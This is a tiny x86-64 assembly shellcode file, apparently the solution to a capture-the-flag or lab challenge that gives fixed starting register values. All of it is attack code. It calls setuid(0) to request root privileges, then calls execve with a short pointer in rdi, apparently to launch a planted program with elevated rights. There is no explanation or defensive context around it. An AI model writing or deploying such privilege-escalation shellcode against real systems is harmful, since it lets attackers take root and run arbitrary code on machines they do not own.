.global _start
_start:
.intel_syntax noprefix

# STARTING FIXED REGISTERS:
    # rdx =   starting rip
    # rax =   0   = 0x0
    # r8  =   22  = 0x16
    # r9  =   3   = 0x3 
    # r11 =   582 = 0x246

mov al, 105
xor edi, edi
syscall

mov al, 59

#XCHG rdi, r8
mov dil, 61

syscall

